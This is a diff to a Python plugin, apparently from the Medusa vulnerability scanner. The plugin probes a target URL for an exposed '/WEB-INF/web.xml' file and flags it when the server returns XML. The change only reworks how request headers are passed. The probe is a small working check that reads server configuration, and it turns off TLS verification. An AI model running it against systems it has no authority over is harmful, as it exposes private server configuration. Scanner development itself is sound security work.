@@ -22,17 +22,15 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
     try:
         payload = "/WEB-INF/web.xml"
         payload_url = Url+ payload
-        headers = {
-            'User-Agent': RandomAgent,
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
-        resp = requests.get(payload_url,headers=headers, proxies=proxies, timeout=6, verify=False)
+        Headers["Accept-Language"] = "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
+        Headers["Accept-Encoding"] = "gzip, deflate"
+
+        resp = requests.get(payload_url,headers=Headers, proxies=proxies, timeout=6, verify=False)
         con = resp.text
         code = resp.status_code
         if code == 200 and resp.headers["Content-Type"] == "application/xml":
